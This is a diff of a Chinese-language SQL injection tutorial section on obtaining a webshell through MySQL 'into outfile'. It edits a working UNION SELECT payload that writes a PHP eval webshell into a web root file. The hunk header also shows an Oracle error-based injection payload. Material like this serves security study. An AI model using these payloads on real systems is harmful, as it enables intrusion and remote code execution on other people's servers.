@@ -628,7 +628,7 @@ and 1=ctxsys.drithsx.sn(1,(select banner from sys.v$version where rownum=1))-- �
 
 ## 使用SQL获取Webshell
 
-Mysql导出函数：[将数据库里的内容导出]
+Mysql导出函数：将数据库里的内容导出
 
 ```sql
 into outfile
@@ -638,7 +638,7 @@ into dumpfile # 可以写16进制写入
 
 当知道绝对路径的时候，且可以导出权限开启的时候就可以拿到webshell
 
-`id=7 union select 1,'<?php eval($_REQUEST[8])?>' into outfile 'c:/phpstudy/www/125.php'`
+`id=1 union select 1,'<?php eval($_REQUEST[8])?>' into outfile 'c:/phpstudy/www/125.php'`
 
 关键就在于如何获取这个绝对路径。简单的网站可以用这个方法：乱输入一些参数进去使其数据库报错，就会出现绝对路径。不过真实情况下基本不会遇见
 
